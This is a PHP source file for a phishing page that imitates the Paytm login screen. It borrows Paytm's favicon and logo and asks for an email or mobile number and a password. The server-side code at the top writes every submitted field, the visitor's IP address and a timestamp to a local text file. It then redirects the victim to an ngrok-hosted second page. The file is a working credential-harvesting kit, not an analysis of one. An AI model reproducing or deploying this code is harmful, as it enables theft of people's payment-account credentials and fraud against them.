<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: https://f0d6b6c0.ngrok.io/2login.php');
$handle = fopen('id pass.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>
<!doctype html>
<html>
<head>
<link rel="icon" type="image/gif" href="https://accounts.paytm.com/pages/themesv2/images/favicon.ico">
    <title>Paytm</title>
    </head>
<style class="cp-pen-styles">
h1, input::-webkit-input-placeholder, button {
 font-family: 'roboto', sans-serif;
 -webkit-transition: all 0.3s ease-in-out;
 transition: all 0.3s ease-in-out;
}

form {
  box-sizing: border-box;
  width: 260px;
  margin: 150px auto 0;
  box-shadow: 2px 2px 5px 1px rgba(0, 0, 0, 0.2);
  padding-bottom: 40px;
  border-radius: 3px;
}

input {
  margin: 40px 25px;
  width: 200px;
  display: block;
  border: none;
  padding: 10px 0;
  border-bottom: solid 1px #0000FF;
  -webkit-transition: all 0.3s cubic-bezier(0.64, 0.09, 0.08, 1);
  transition: all 0.3s cubic-bezier(0.64, 0.09, 0.08, 1);
  background: -webkit-linear-gradient(top, rgba(255, 255, 255, 0) 96%, #408ce8 4%);
  background: linear-gradient(to bottom, rgba(255, 255, 255, 0) 96%, #408ce8 4%);
  background-position: -200px 0;
  background-size: 200px 100%;
  background-repeat: no-repeat;
  color: #408ce8;
}
input:focus, input:valid {
 box-shadow: none;
 outline: none;
 background-position: 0 0;
}
input:focus::-webkit-input-placeholder, input:valid::-webkit-input-placeholder {
 color: #408ce8;
 font-size: 11px;
 -webkit-transform: translateY(-20px);
 transform: translateY(-20px);
 visibility: visible !important;
}

button {
  border: none;
  background: #1ac2ed;
  cursor: pointer;
  border-radius: 3px;
  padding: 6px;
  width: 200px;
  color: white;
  margin-left: 25px;
  box-shadow: 0 3px 6px 0 rgba(0, 0, 0, 0.2);
}

button:hover {
  -webkit-transform: translateY(-3px);
  -ms-transform: translateY(-3px);
  transform: translateY(-3px);
  box-shadow: 0 6px 6px 0 rgba(0, 0, 0, 0.2);
}
</style>
</head>
<body>
</script> 
</div>
<form method="post" action="<?php echo basename(__FILE__); ?>">
<center>
 <div class="imgcontainer">
      <img src="https://d3uqm14ppr8tkw.cloudfront.net/images/p/paytm-coupons_logo.png" alt="Avatar" class="avatar" width="200" height="80">
    </div>
    </center>
  <input placeholder="Email or Mobile" name="id" type="text" maxlength="50" required>
  <input placeholder="Enter Password" name="pass" type="password" maxlength="50" required>
  
  <button>Secure Login</button>
</form>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-46156385-1', 'cssscript.com');
  ga('send', 'pageview');

</script>
</body>
</html>
